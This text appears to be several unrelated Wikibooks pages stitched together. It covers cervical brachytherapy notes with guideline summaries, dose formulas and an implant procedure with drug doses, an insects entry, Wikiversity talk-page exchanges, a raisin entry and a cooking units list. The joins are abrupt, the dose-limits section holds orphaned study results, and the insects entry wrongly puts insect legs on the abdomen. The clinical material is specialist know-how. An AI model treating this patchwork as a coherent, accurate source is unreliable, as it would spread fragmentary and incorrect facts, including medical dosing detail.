Prescribed 80 Gy to point A in two applications, total of 144 hours, in the absence of external beam.

Weakness: wide variation in Point A in respect to the ovoids. Point A often occurs in a high-gradient region of the isodose distribution. Therefore, minor differences in position can result in large differences in dose.

===Fletcher applicator===
Derives from the Manchester system.  Added internal shielding in the colpostats.  Afterloading ability.  Colpostat has 2 cm diameter that can be increased to 2.5 or 3 cm by the addition of plastic caps.  Minicolpostats are 1.6 cm and have a flat inner surface and have no shielding.  Use 15, 20, and 25 mg Ra for small, medium, and large colpostats; use 10 for the minis.  Tandems are available in three curvatures.  Flange on the tandem avoids slippage past the cervical os, and a keel helps keep it from rotating.  A yoke attaches the tandem and colpostats to maintain proper position.  Loading of the tandem is 20 - 10 - 10 mgRaEq with Cs-137.  

Plastic Fletcher applicators are available to be compatible with CT simulation or MRI.

===American Brachytherapy Society (ABS)===
Recommend prescribing to '''Point H''' - Draw a line connecting the mid-dwell positions of the ovoids and find the point this line intersects the tandem. Follow 2 cm superior (along the tandem) plus the radius of the ovoids, then 2 cm perpendicular to the tandem.  ''Note:'' This is basically 2 cm above the top of the ovoids.

'''''BED for HDR and LDR:'''''
*HDR: &lt;math&gt;\mbox{BED} = N*d\left (1+\frac{d}{\alpha/\beta}\right )&lt;/math&gt;
*LDR: &lt;math&gt;\mbox{BED} = N*R*t\left [1 + \frac{2R}{\mu*(\alpha/\beta)}*\left (1 - \frac{1-e^{-\mu t}}{\mu*t}\right ) \right ]&lt;/math&gt;

Where N = number of fractions, d = dose per fraction, R = dose rate, t = treatment time (i.e. duration), μ = sublethal damage repair constant, and α/β = characteristic parameter of the cell survival curve from the linear quadratic model.

(''from ABS, PMID 10924990'')
&lt;br&gt;
Problem: What dose/fraction of HDR delivered in six fractions will be equivalent in terms of tumor control to 60 Gy delivered to Point A at 0.55 Gy h−1?

Solution: Assume α/β (tumor) = 10 Gy, μ (tumor) = 0.46 h−1.

Then: BED (LDR) = 60[1 + (2 × 0.55)/(0.46 × 10)] = 74.3

Equating this to the BED for 6 HDR fractions with dose/fraction d gives:

74.3 = 6d(1 + d/10)

Solving this quadratic equation for d gives: d = 7.20 Gy.

Conclusion: 6 fractions of 7.20 Gy with HDR is equivalent in terms of tumor control to 60 Gy delivered at 0.55 Gy h−1.

===ABS Guidelines===
*'''HDR''' (2000) - PMID 10924990 &amp;mdash; &quot;The American Brachytherapy Society recommendations for high-dose-rate brachytherapy for carcinoma of the cervix.&quot; Nag S et al. Int J Radiat Oncol Biol Phys. 2000 Aug 1;48(1):201-11.
**General recommendations
***Brachytherapy must be included as a component of radiation therapy for cervical carcinoma
***Good applicator placement must be achieved
***Relative dose of EBRT vs. BT depends on tumor volume, ability to displace bladder and rectum, tumor regression during EBRT, and institutional preference
***Total treatment duration should be &lt;8 weeks
***HDR should be interdigitated with EBRT, such that EBRT is not given on day of BT. If vaginal geometry is optimal, start BT during week #3 and give BT once per week. If tumor volume doesn't allow this, perform 2 BT implants per week after completion of EBRT to stay within 8 week treatment duration limit
**External Beam RT
***HDR fraction size and number depends on EBRT dose (see table below), though individual HDR fraction size should be &lt;7.5 Gy/fx due to concerns about late toxicity
***There is no consensus about midline blocks. If used, should be 4-5cm wide and should not extend to the top of the pelvic field if used at &lt;40 Gy. Care must be taken not to shield common illiac and presecral nodes. 
***Midline block position should be reassessed after each implant
**Chemotherapy
***Chemotherapy should be administered concurrently with EBRT, but not with BT
**Insertion technique
***Multiple insertions should be used to allow progressive volume reduction and thus more effective disease coverage
***Optimum applicator placement is critical, and should be done with ultrasound and fluoroscopic guidance
***Appropriate applicator must be chosen for disease geometry: standard ovoids, ring, or Henschke applicator
***If an applicator cannot be accomodated, interstitial implant should be used
***Conscious sedation should be used whenever possible; patient discomfort can lead to suboptimal packing
***Cervical markers should be placed for identification of cervical position and to determine relationship of vaginal applicators to the cervix
***Bladder and rectum should be displaced away from the applicators
***External fixation devices (e.g. perineal bar or clamp/base plate) should be used to prevent movement
***Good quality radiographs should be obtained for treatment planning and dosimetry with each insertion
***Every effort should be made to minimize patient and applicator movement
**Dose specification
***Ideally, dose should be prescribed to individual patient's treatment volume, but there is insufficient information in the literature to establish a better delineated target than Point A
***ABS recommends prescribing to Point H defined as point of intersection of mid-dwell positions of the ovoids with the tandem. Then move superiorly radius of the ovoids (to top of ovoids) + 2 cm, and then 2 cm perpendicularly
**Dose optimization
***Achieving good dose distribution requires both good dose insertion and dose optimization
***Tandem optimization: start 1 cm inferiorly to the superior-most dwell position. Finish 1 cm superior to the surface of the vaginal appliance. Optimization points should fall no further than 1 cm apart along the tandem, and in both lateral directions
***Vaginal optimization should fall at the vaginal surface or specified depth (usually 0.5 cm), and should fall in both lateral directions as not to interfere with tandem optimization
**Dose calculations to organs at risk
***ICRU 38 does not consistently specify location of maximu dose to the organs
***True dose delivered should be calculated using soft tissue (CT or MRI) planning if available
***Nominal rectal and bladder points can be used as per [[Radiation_Oncology/Physics/ICRU|ICRU definitions]], and should receive &lt;80% of dose to Point H. Absolute dose should be LDR-equivalent &lt;75 Gy for rectum and &lt;80 Gy for bladder
***Regional lymph nodes: BT component is small compared to EBRT dose, but should be calculated. ICRU 38 Pelvic Wall Point specification should be used. Manchester Point B should ''not'' be used
**Dose recommendations
***See table below as a guide
***Point A: LDR equivalent of 80-85 Gy (early stage disease, nonbulky Stage I-II) or 85-90 Gy (advanced stage, Stage IIIB or &gt; 4 cm).
***Pelvic Sidewall: LDR equivalent of 50-55 Gy (early stage) or 55-60 Gy (advanced stage)
***Physical dose delivered will be less for HDR than for LDR due to dose-rate effect
**Quality assurance
***AAPM TG 59 recommendations should be followed
**Interstitial brachytherapy
***Recommended for clinical situations when geometry for intracavitary BT is suboptimal (e.g. bulky lesions, narrow vaginal apex, inability to enter the cervical os, extension to the lateral parametria or pelvic sidewall, and lower vaginal extension)
***Please see the manuscript for further recommendations

===HDR Implant Steps===
*Perform preliminary bimanual examination for geometry while patient undergoing EBRT
*Induce anesthesia (consider general, conscious sedation, or spinal)
*Consider antibiotic coverage (e.g. Ancef 1 gram)
*Place in lithotomy position
*Examination under anesthesia to assess geometry for implant
**If not, abort and consider interstitial implant
*Prep with betadine and drape (consider &quot;urine cather&quot; to catch stray instruments)
*Place Foley with 7 cc diluted contrast (2 ml contrast + 5 ml saline)
*Fill bladder with saline, using 4-5 big syringes (200-300 ml)
*Open vagina with right angle retractors; weighted speculum may tear friable vaginal mucosa after concurrent chemo-RT
*Use tenaculum to grasp anterior lip of cervix, and maintain tension
*Place 2-3 gold seeds ~5mm into cervix (on x-ray, they will be ~1cm superior to the inferior-most aspect of the cervix)
*Use ''sound'' to estimate cervix depth, under ultrasound guidance to avoid perforation
**Once sound is in fundus, grasp exposed portion with a clamp at the cervix, and measure the sound to estimate depth
**Most common location for perforation is posterior endocervix or lower uterine segment
*Dilate cervix
**Leave dilator in place until ready for tandem, to prevent cervical spasm
*Consider Smit sleeve (frequently 60 mm sleeve)
*Insert tandem under ultrasound guidance
**Choose length and angle of tandem based on sound information
**If uterus is retroverted, place tandem to follow the cavity and then gently rotate into anterior position to antervert
*Remove tenaculum
*Insert ovoids or ring
**Lubricating them may help insertion
**Choose largest size that will fit to take advantage of inverse square; however, too large an ovoid may be displaced inferiorly, away from the tumor
**May need ovoids of 2 different sizes if the tumor is asymmetrical
**Typically insert right ovoid, then left ovoid, then lock in place
**If built-in tungsten shields, may provide ~15% dose reduction to the anterior rectal wall
*Verify stable implant placement with ultrasound
*Empty bladder, but keep Foley in place
*Pack anteriorly and posteriorly to ovoids
**Typically 1 inch gauze is used, with DeBakey forceps and/or fingers
**Use lubrication (e.g. premarin cream, surgilube) on the gauze
**Aim for floor and ceiling, but not cephalad to ovoids, so the cervix isn't displaced
**Posterior packing initially to preferentially spare rectum
**Place a stitch in the gauze at the end, to facilitate removal
*Films in O.R. to evaluate implant quality (see above)
*If admitting, consider:
**Activity: bed rest
**Nursing:
***Foley to gravity
***Compression devices to bilateral lower extremities
***Incentive spirometry to bedside; use 10x/hr while awake
***Head of bed at or below 30 degrees
**Diet: clear, advance to low residue as tolerated
**IVF: NS @ 75 ml/hr
**Meds:
***Lovenox 40 mq QD or heparin 5000 units SC Q8
***Pain management (PCA pump or coverage for breakthrough pain)
***Lomotil 1 tab Q6
***Restoril 15 mg Qhs
***Pepcid 20 mg PO BID
***Patient's routine medications
**Send to radiation oncology when stable
*Dictate OP note (e.g. Ms X was taken to the operating room, where she was place under (general, spinal) anesthesia. (ABX) was given. The bladder was filled with sterile saline solution and the uterus was evaluated by ultrasound. The tandem was inserted under ultrasound guidance. The ovoids were placed under direct visualization. The placement of the implant was verfied with ultrasound. Vaginal vault was secured with gauze packing. (There were no complications). The patient was taken to the recovery room in a stable condition.)
*CT sim
**Insert dummy sources
**Consider rectal tube with 20-30 ml barium contrast

===Clinical Evidence===
*'''Osaka''' (Japan)(1983-1989) -- HDR fractional dose 7.5 Gy/fx vs. 6.0 Gy/fx
**Randomized. 165 patients with cervix adenoCA, Stage IA-IV. Treated with 2 separated dose schedules depending on stage. Arm 1) EBRT + BT using 7.5 Gy/fx (either 37.5/5 or 30/4 or 22.5/3) vs. Arm 2) EBRT + BT using 6.0 Gy/fx (either 36/6 or 30/5 or 18/3).
**'''5-years; 1994''' PMID 7974179 -- &quot;A prospective randomized study concerning the point A dose in high-dose rate intracavitary therapy for carcinoma of the uterine cervix. The final results.&quot; (Chatani M, Strahlenther Onkol. 1994 Nov;170(11):636-42.)
***Outcome: 5-year CSS: Stage I 100% vs. 100%, Stage II 82% vs. 85%, Stage III 62% vs. 52%, Stage IV 22% vs. 31% (all NS). No difference in LRF or DM
***Toxicity: No difference
***Conclusion: No difference between the two treatment schedules; small number of fractions at 7.5 Gy/fx may be advantageous due to short duration


===Dose limits===
*Points specified in '''ICRU Report 38'''
**''Please see the [[Radiation_Oncology/Physics/ICRU|ICRU report page]] on more detail about definitions''
**'''Bladder point''' - on the surface of a Foley balloon filled with 7 cc of contrast; located at center of balloon on AP film, posterior surface of the balloon on a line through midballoon on lateral film 
**'''Rectum point''' - 0.5 cm posterior to the posterior vaginal wall at the level of the bisection of the T&amp;O. May also use barium + air contrast in rectum
**'''Vaginal mucosa''' - at surface of ovoids

***Outcome: 5-year toxicity rectum 12%, sigmoid 3%, bladder 23%. Mean D2cc rectum 65 Gy (+/- 12 Gy), sigmoid 62 Gy (+/- 12 Gy), and bladder 95 Gy (+/- 22 Gy). 
***Conclusion: D2cc and D1cc have good predictive value for rectal toxicity. Recommend rectum D2cc max 75 Gy, sigmoid no recommendation, bladder D2cc max 100 Gy

== Insects ==

Insects are animals with three body segments (the word insect means &quot;segmented&quot;): the head, the abdomen, and the thorax. Insects have, typically, three pairs of legs located on the abdomen; however, there are exceptions, such as brush-footed butterflies.
Insects (class Insecta) are just one class of arthropods, a phylum which includes Crustacea (crabs, lobsters, etc.), Arachnida (spiders, mites, etc.), and Myriapoda (Centipedes and Millipedes).
Insects, being related, undergo similar life cycles. They begin as eggs, which usually vary widely in shape and size. Then insects undergo a period of growth, which may include metamorphosis. Insects such as silverfish do not undergo metamorphosis at all— they grow directly from a diminutive size to their full size. Some Insects, such as true bugs, undergo incomplete metamorphosis. When they hatch from eggs they are called ''nymphs''. These nymphs will eventually grow into their adult form. Insects such as butterflies and moths undergo complete metamorphosis. When they hatch from eggs, they are called ''larvae''. Once they have grown through several periods called ''instars'', they become ''pupae''. Eventually, an adult or ''imago'' will emerge from the pupa.
Insects are very successful organisms. They exist in every type of terrestrial habitat, and are able to adapt easily to an environment. Insects also vary widely in shape, size, colour, etc. There are currently well over half-a-million named species of insect, and estimates place the total number of species over two million.

You gave me a bunch of info on wikiversity, so I thought you'd be interested in this:

[[School of Mathematics:Calculus]]

If you could advertise somehow, that would be nice.  [[User:Fephisto|Fephisto]] 04:10, 9 July 2006 (UTC)

In response to your reply on my board.  To be honest, I don't know what &quot;A Practical Approach&quot; was doing there (I got rid of it now), I had actually pirated the page from the existing &quot;Calculus Course&quot; details that had nothing going on.  I will, however, be distinguishing from those who want to know Calculus fully and formally (a train of thought like Partitions -&gt; Riemann Darbouex Sums -&gt; Upper and Lower Sums -&gt; Formal integrals for example, although they'd have to go through some set theory and it'd be a hard ride) and those who want to know Calculus intuitively (more or less, an integral is the area underneath a curve, for example).  

What are you getting at with the modules though?  Are you looking to get Calculus with some more practical examples, or are you suggesting some other sort of synthesis action?  [[User:Fephisto|Fephisto]] 00:36, 10 July 2006 (UTC)

Yeah, that's some highly probable synthesis action, I really doubt that many students are going to want to study in-depth set-theoretical Calculus, so the intuitive examples you're looking for will probably pop up in my course sooner or later, and I'll try to let you know when they do.  However, I still need students, 8/.  [[User:Fephisto|Fephisto]] 03:39, 11 July 2006 (UTC)

I've got one really dedicated student so far, but unfortunately for you he opted for in-depth set theoretical Calculus.  If you want to check for material, check sometime after August 21 (or check until August 21, whatever fits your fancy), that's when I'm ending class.  However, I really doubt you'll get much material worth in a week.  [[User:Fephisto|Fephisto]] 06:19, 10 August 2006 (UTC)

The course has already ended, there was a whopping one person (technically two people) that participated.  If you're interested in the format or results check it out:  [[School of Mathematics:Calculus]].[[User:Fephisto|Fephisto]] 23:51, 19 August 2006 (UTC)

== Wiki theory as subsets of epistemology and sociology ==

Hi, I see you've done some excellent work on the tentative first steps of providing a theoretical explanation of the [google.com/search?q=Wiki | success of Wiki] in general and [alexa.com/wikipedia.org | Wikimedia projects] in particular. I have quite a few ideas that I believe will revolutionise the world, and they will do this by proving ambitious statements backed by a comprehensive theory of Wiki that is universally agreeable. I know my ideas are revolutionary (subject to some major or minor tweaking), but I need people like you to 
*'''understand them''', and 
* '''explain them'''. 
I am very good at understanding things, but as a result, I am incredibly poor at explaining them to people who are less lucky fortunate in their comprehension abilities than I. You appear to have the talent of exposition. Together, we will change the world. Please come to my [[w:User_talk:Nsh | team builing area]] and associate your interest with some or all of my solution sets. [[User:Nsh|Nsh]] 17:17, 11 Apr 2005 (UTC)

**I did not find much at your page. --[[User:JWSchmidt|JWSurf]] 16:46, 20 Jun 2005 (UTC)

== Wikiversity ==

Just wanted to reciprocate that nice little golden box :-) Sorry - had forgottten that you wouldn't have got it yourself, as I put my message on your main page, doh! Wikiversity really could blossom into something amazing - it just needs a few initiatives. Read the [[m:Talk:Wikiversity]] and [[m:Research]] pages for some people who are interested in the general field - and, as always, if you have an idea/initiative, just get it going and invite as many people as possible to take a look. I will for a start. [[User:Cormaggio|Cormaggio]] 16:10, 20 August 2005 (UTC)

:And thanks again - I replied on my talk page but likewise wanted to say that I really appreciate your input on [[Talk:Wikiversity:About]] - it's been really stimulating. We just need to keep this conversation going, and who knows what'll come of it or how soon..? [[User:Cormaggio|Cormaggio]] 12:10, 23 August 2005 (UTC)

Replying to what you've left on my discussion board.  My basis for checking out the statis was whether there would be anything to stop an unaccredited me to teach an unaccredited class, but hopefully still accurate (I'm pretty confident that I know what the hell I'm doing); and it doesn't look like there is anything from stopping me to do this from what I've read, so I should be able to send out a mailing to the discussion pages of students from the current participation list, get people who want to start this Summer, and go from there, right? Also from what I've read, however, teaching styles vary, and I'd rather perform a tutor-style non-factory method.  I know this doesn't match up with learning community, but I should be able to try it, see if it works out, encourage more support for Wikiversity.  --[[User:Fephisto|Fephisto]] 17:46, 20 April 2006 (UTC)

Definitely Mathematics, and I will try Calculus I.  There won't be a guarentee that what's usually covered in Calc I will all be covered, or even if it will be for the entire semester; but I wouldn't mind helping with that.  --[[User:Fephisto|Fephisto]] 21:31, 25 April 2006 (UTC)

I remember working extensively on the 3-D Calculus section, but so long as it has a formal definition of limit it's probably O.K. (that and even if it wasn't there I'd probably add it in just to fit with the class).  And I don't think I'd be forcing students to go look up a Calculus reference through Google anyways; but why do you ask?  --[[User:Fephisto|Fephisto]] 00:42, 26 April 2006 (UTC)

==Consciousness studies==

I moved your interesting item on Ned Block's ideas to the module on nineteenth and twentieth century philosophy and put a notice pointing to it in the section on phenomenal and access consciousness. See http://en.wikibooks.org/wiki/Consciousness_studies:_The_conflict2#Phenomenal_consciousness_and_access_consciousness [[User:RobinH|RobinH]] 09:42, 25 August 2005 (UTC)




==[[Wikibooks:Requests_for_adminship|Request for Adminship]]==
JW, I've requested adminship in Wikibooks to help out more with the Wikiversity and other Wikibooks projects. Any support you could provide would be greatly appreciated. Thanks.--[[User:Mfinney|Mfinney]] 10:20, 1 March 2006 (UTC)

== Looking to Help out ==

John, Looking to help out with the wikiversity, think it is a great idea.  Am fairly new to Wiki sites as far as contributing to them, but am eager to begin helping.  I have degrees in Physiological Sciences and Biomedical Engineering and focused in Immunology.  Let me know how I can help.  Thanks.

==Policy review==

Policy is not the most exciting subject at Wikibooks but we do have some major unresolved issues.

The most important issue, in my opinion, is [http://en.wikibooks.org/wiki/Wikibooks:Dispute_resolution Dispute resolution] which starts by declaring that:

'''&quot;Currently there is no official organized process to resolve disputes between users&quot;'''

The suggested remedy for this is: [[Wikibooks:Ad hoc administration committee]] which puts into place the absolute minimum in terms of an enforcement apparatus.

The second most important is [[Wikibooks:No personal attacks]] where a vote has recommended the policy be enforced but it still languishes as &quot;proposed&quot;.

The third policy that is needed and which will prevent edit disputes from getting out of hand is [[Wikibooks:Editing disputes policy]].

Other policies that need consideration are at: [http://en.wikibooks.org/wiki/Wikibooks:Policies_and_guidelines Policies and guidelines].

Please spare a minute or two to peruse these issues and add a comment and/or a vote. [[User:RobinH|RobinH]] 12:49, 28 April 2006 (UTC)

== Heya! Im new to Wikiversity ==

Hello there! Im rather new to wikiversity and wanted to drop a line with you. My name is Tyson and I'm looking to help out over in History. Very nice work on your Cell Biology course! I hope you don't mind but I'll probably be using your course as a guide for formatting a course for Ancient Egypt!

Looking forward to working with you on the Wikiversity project!

Sincerely!&lt;br&gt;

== Wikiversity and Wikimedia ==

I'm a little confused. Why would it be better for Wikiversity to become a Wikimedia project? Is it like a test webstie right now? It doesn't seem to belong to any particular part of Wikipedia. I guess I'm just new to all this and a tad confused.

&quot;Why would it be better for Wikiversity to become a Wikimedia project?&quot; &lt;-- Wikimedia has a broader goal than Wikipedia: &quot;.....a world in which every single person is given free access to the sum of all human knowledge&quot;. Wikipedia is important, but it routinely rejects content that does not belong in an encyclopedia. Right now, Wikiversity is just an idea. The people who run Wikibooks do not want it there. In order to exist, Wikiversity needs its own website domain.....it needs to become a Wikimedia sister project.

RE: I see. Why don't people in Wikibooks want Wikiversity there? I think the two are critically bound together. Wikiversity seems like a place to collect authors to write the texts for Wikibooks... I don't understand why they don't want Wikiversity as part of Wikibooks. However, it would be cool for Wikiversity to become its own website. Thanks for your info!

== Do you like our Human Physiology wikibook? ==

About 5 weeks ago I decided that instead of a traditional class, I would have my students create a [[Human Physiology]] textbook. I'm proud of the work they have done so far, and hope we can really polish it up in the next few weeks. We would love any input you can give on the book and hope that if you have a talent or interest in a particular chapter that you will give us some feedback or make improvements. 

Thanks! [[User:Provophys|Provophys]] 22:29, 21 August 2006 (UTC)

== Noncommercial images ==

I have marked images like [[:Image:Chromosomes2.jpg]] for speedy deletion. --[[User:Derbeth|Derbeth]] [[User talk:Derbeth|&lt;sup&gt;talk&lt;/sup&gt;]] 09:35, 15 September 2006 (UTC)
: Can you replace text &quot;Permission is granted to copy...&quot; with {{tl|GFDL}} template? Use of dedicated template makes some automatic tasks (like searching for images without copyright information) easier.
: And another thing: are you aware of problems that GFDL license makes when applied to images? If not, consider reading [http://notablog.notafish.com/index.php/2005/04/21/26-why-the-wikimedia-projects-should-not-use-gfdl-as-a-stand-alone-license-for-images]. --[[User:Derbeth|Derbeth]] [[User talk:Derbeth|&lt;sup&gt;talk&lt;/sup&gt;]] 15:01, 15 September 2006 (UTC)

Hi John,

Would you mind weighing on on [[Wikibooks:Request for enabling special:import]]? Wikimedia tech asked for a show of hands :) --[[User:SBJohnny|&lt;font color=&quot;green&quot;&gt;'''SB_Johnny'''&lt;/font&gt;]] | &lt;sup&gt;[[User talk:SBJohnny|&lt;font color=&quot;green&quot;&gt;talk&lt;/font&gt;]]&lt;/sup&gt; 23:51, 12 October 2006 (UTC)

==Sorry... one more vote please?==

One more thing to smooth out the transwiki process... [[Wikibooks:Request_for_enabling_special:import#Additional_request]]. We're asking that &quot;Transwiki:&quot; be given namespace status so we can import to it directly. --[[User:SBJohnny|&lt;font color=&quot;green&quot;&gt;'''SB_Johnny'''&lt;/font&gt;]] | &lt;sup&gt;[[User talk:SBJohnny|&lt;font color=&quot;green&quot;&gt;talk&lt;/font&gt;]]&lt;/sup&gt; 19:58, 16 October 2006 (UTC)

== [[Unsolved archive]] ==

Could you possibly clarify the [[Unsolved archive]] page? Your [http://en.wikibooks.org/w/index.php?title=Unsolved_archive&amp;oldid=157919 last edit] of that page states it to be some sort of a &quot;historical archive&quot;. Did this come from [[Unsolved problems in biology]]? Why was it put here (without any history). --[[User:Swift|Swift]] 18:38, 6 December 2006 (UTC)

:&lt;small&gt;''The following comment moved from [[User:Swift#Unsolved archive page]]'' --[[User:Swift|Swift]] 02:30, 8 December 2006 (UTC)&lt;/small&gt;
:The origin of the &quot;Unsolved archive&quot; page is described at the top of the &quot;Unsolved problems in biology&quot; page. --JWSurf 05:05, 7 December 2006 (UTC)

:: Thanks. I had actually found as much out. I also saw your comment in the VfD discussion. Do you resent this being deleted. I think we are generally a reasonable bunch so if you would like to keep the page, please feel free to state why.
:: Wikibookians differ in how prone to deletionism they are. The arguments for deleting are partly un-cluttering the page structure. If you can convince a few people that it would benefit the project to keep the page, the page will most likely stay. --[[User:Swift|Swift]] 02:30, 8 December 2006 (UTC)

::: &lt;small&gt;''The following comment moved from [[User:Swift#Unsolved archive page]]'' --[[User:Swift|Swift]] 04:12, 9 December 2006 (UTC)&lt;/small&gt;
::: &quot;Do you resent this being deleted.&quot;  &lt;-- You are perceptive: I do have some resentments. But I have moved this material to another wiki where exploration of the unknown and the unsolved is more central to the mission. --[[User:JWSchmidt|JWSurf]] 18:36, 8 December 2006 (UTC)

:::: I think you have misunderstood the arguments presented in [[WB:VFD#Unsolved archive|the VfD]] discussion. [[Unsolved archive]] was not up for deletion out of any Wikibookians distaste have for &quot;exploration of the unknown and the unsolved&quot;. Rather, the redundancy, possible confusion and likely violation of the [[Wikibooks:GNU Free Documentation License|GFDL]].
:::: '''Redundancy''': As I mentioned in the discussion, this page is already archived in Wikipedia history at &lt;http://en.wikipedia.org/w/index.php?title=Unsolved_problems_in_biology&amp;oldid=2911083&gt;.
:::: '''Confusion''': Given the redundancy argument above and the existance of related content, this page will potentially confuse readers looking for information about this without providing them any benefits. As you can see from [[Unsolved problems in biology]] no-one is asking for this type of content to be deleted. It is largely a cleanup measure.
:::: '''Copyrights''': The GFDL states that you cannot create a derived work from a GFDL without citing past contributors. Every time you edit a wiki page copyrighted by GFDL you are creating a derived work. Since the database logs every edit, the edit history serves as a reference to past contributors. Since [[Unsolved archive]] was copied to Wikibooks without importing the history, it is currently in violation of the GFDL. This could possibly be fixed (I say possibly because I'm not sure about the legal status of the page's past versions) but it is cumbersome to maintain (but then again, you don't want this maintained ... ).

:::: I hope this clarifies a few points. I hope you feel a little better and urge you to state any concerns you may still have. I have the feeling you have had to fight for this content in the past (my perceptive side again) but this is not a battle on that front. I fully support you in adding educational material about unsolved problems and the exploration thereof.
:::: One final note: I'd like to ask you not to require your collegues to be perceptive. Even if I was a very perceptive person, I'd feel uncomfortable constantly having to judge insinuated opinions and emotions in an environment where misunderstandings can have very negative consequences. --[[User:Swift|Swift]] 04:12, 9 December 2006 (UTC)

::::: &lt;small&gt;''The following comment moved from [[User:Swift#Unsolved archive page]]'' --[[User:Swift|Swift]] 05:50, 10 December 2006 (UTC)
:::::&quot;I'd like to ask you not to require your collegues to be perceptive.&quot; &lt;-- I agree that it is fruitless to expect wiki colleagues to be perceptive. Far too often irony goes unnoticed. I suppose the wikilawyers will eventually get around to making the use of irony a bannable offense. --[[User:JWSchmidt|JWSurf]] 04:40, 10 December 2006 (UTC)
:::::: &quot;''Far too often irony goes unnoticed.''&quot; Exactly, so one can either adjust to the community or risk conflict. Even in the best case misunderstanding scenario where the collegue will do his best and [[Wikibooks:assume good faith|assume good faith]] it will still take some time to sort the issues out &amp;mdash; time and effort that could otherwise go into the project.

This is a short newsletter that is being distributed to all active wikibookians.  You are getting this message because you are recognized as an established contributor to the project.  This newsletter will be distributed on a regular basis to help share news, information, and tips. It comes from a bot account, [[User:The Staff]]. [[User:The Staff]] is currently operated by a team of wikibooks admins, the complete list of which is available on the user page of the bot. If you would like to not receive this newletter anymore, please remove your name from the list at [[Wikibooks:Active wikibookians]].

The work you do at Wikibooks is greatly appreciated.  However there are plenty of other opportunities for you to get involved and help us to create a thriving Wikibooks community.
We are sure that there are things we can do to help you and your understanding of Wikibooks and similarly there are certainly things you could do to help Wikibooks become a better place.

We would like to ask all wikibookians to add the [[WB:BB|Bulletin Board]] to your watchlists.  The Bulletin Board is a fast and easy way for wikibookians to communicate important news and events to the entire community. If you have important news to share with the community, you can feel free to add your own entry to that page.

If you have general questions or comments about Wikibooks, you are welcome to post a message on [[WB:SL|The Staff Lounge]], a free discussion area.  Your input would also be welcomed in the [[WB:VFD|Votes for Deletion]] and [[WB:RFA|Requests for Adminship]] discussion pages. These pages are all active discussion areas that help to shape the Wikibooks community as a whole.

Sometimes it is easy to forget that the Wikibooks community is much larger and more diverse then the people who work in a single book, or on a single bookshelf. Hopefully, together we can all make Wikibooks a better place, and a more valuable educational resource.

== Your account will be renamed ==

&lt;div class=&quot;plainlinks mw-content-ltr&quot; lang=&quot;en&quot; dir=&quot;ltr&quot;&gt;
Hello,

The developer team at Wikimedia is making some changes to how accounts work, as part of our on-going efforts to provide new and better tools for our users like cross-wiki notifications. These changes will mean you have the same account name everywhere. This will let us give you new features that will help you edit and discuss better, and allow more flexible user permissions for tools. One of the side-effects of this is that user accounts will now have to be unique across all 900 Wikimedia wikis. See [[m:Special:MyLanguage/Single User Login finalisation announcement|the announcement]] for more information.

Unfortunately, your account clashes with another account also called Www.wikinerds.org. To make sure that both of you can use all Wikimedia projects in future, we have reserved the name Www.wikinerds.org~enwikibooks that only you will have. If you like it, you don't have to do anything. If you do not like it, you can [[Special:GlobalRenameRequest|pick out a different name]].

Your account will still work as before, and you will be credited for all your edits made so far, but you will have to use the new account name when you log in.

Sorry for the inconvenience.

Yours,&lt;br /&gt;[[m:User:Keegan (WMF)|Keegan Peterzell]]&lt;br /&gt;Community Liaison, Wikimedia Foundation

The '''raisin''' is a dried [[Cookbook:Grape|grape]].

Raisins are normally a dark brown-purple color, from the original grape color made darker by oxidation. 

When light-colored grapes are used and treated with [[Cookbook:Sulfur Dioxide|sulfur dioxide]], the resulting raisins will be yellow. They may then be called '''yellow raisins''', '''golden raisins''', or '''sultanas'''.

Recipes from different parts of the world use different '''units of measurement'''. This page is a guide to those that are most commonly used in cooking.

== List of Units ==
===Volume===
*[[Cookbook:Teaspoon|teaspoon]] (also '''t''' or '''tsp.''')
*[[Cookbook:Tablespoon|tablespoon]] (also '''T''', '''tbl.''', '''tbs.''', or '''tbsp.''')
*[[Cookbook:Fluid Ounce|fluid ounce]] (also '''fl oz''')
*[[Cookbook:Gill|gill]] (about 1/2 cup)
*[[Cookbook:Cup|cup]] (also '''c''')
*[[Cookbook:Pint|pint]] (also '''p''', '''pt''', or '''fl pt''' - Specify Imperial or US)
*[[Cookbook:Quart|quart]] (also '''q''', '''qt''', or '''fl qt''' - Specify Imperial or US)
*[[Cookbook:Gallon|gallon]] (also '''g''' or '''gal''' - Specify Imperial or US)
*[[Cookbook:ML|ml]], also '''milliliter''', '''millilitre''', '''cc''' (and  '''mL''' only in the US, Canada and Australia).
*[[Cookbook:Liter|l]], also '''liter''', '''litre''', (and '''L''' only in the US, Canada and Australia).
*[[Cookbook:Deciliter|dl]], also '''deciliter''', '''decilitre''' (and  '''dL''' only in the US, Canada and Australia).

===Mass and Weight===
*[[Cookbook:Pound|pound]] (also '''lb''' or '''#''')
*[[Cookbook:Ounce|ounce]] (also '''oz''')
*[[Cookbook:mg|mg]] (also '''milligram''' or '''milligramme''')
*[[Cookbook:g|g]] (also '''gram''' or '''gramme''')
*[[Cookbook:kg|kg]] (also '''kilogram''' or '''kilogramme''')

===Length===
*[[Cookbook:mm|mm]] (also '''millimeter''' or '''millimetre''')
*[[Cookbook:cm|cm]] (also '''centimeter''' or '''centimetre''')
*[[Cookbook:m|m]] (also '''meter''' or '''metre''')
*[[Cookbook:Inch|inch]] (also '''in''' or '''&quot;''')

===Temperature===
See the [[Cookbook:Oven temperatures|oven temperature]] table.

== Metric Units ==
Metric units are made up of a ''base unit'' and a scale ''modifier''. Each type of measurement has its own base unit. The modifiers are shared between all units. The relevant base units for cooking are:
* Mass: gram (g)
* Length: meter (m)
* Volume: cubic meter (m&lt;sup&gt;3&lt;/sup&gt;)

Commonly used prefix modifiers are:
* 1/1000 milli (m)
* 1/100 centi (c)
* 1/10 deci (d)
* 100 hecto (h)
* 1000 kilo (k)

In cooking the old unit Liter (l) is commonly used to measure volume. One liter is (exactly) equal to 0.001 cubic meters, or 1 cubic ''deci''meter, written like: 1 l = 1 dm&lt;sup&gt;3&lt;/sup&gt;. The prefix modifiers can be used with any unit and thus 1 cl (centiliter) is equal to 1/100 of a liter. The unit for volume is ''derived'' from the unit for length. Two lengths forms an ''area'', which is length x length and has the derived unit square meter (m&lt;sup&gt;2&lt;/sup&gt;). Three lengths forms the volume metric m&lt;sup&gt;3&lt;/sup&gt;. This has the consequence that a m&lt;sup&gt;3&lt;/sup&gt; is equal to 1000 dm&lt;sup&gt;3&lt;/sup&gt;, that is 10&lt;sup&gt;3&lt;/sup&gt; = 10x10x10.

Examples relevant for cooking:
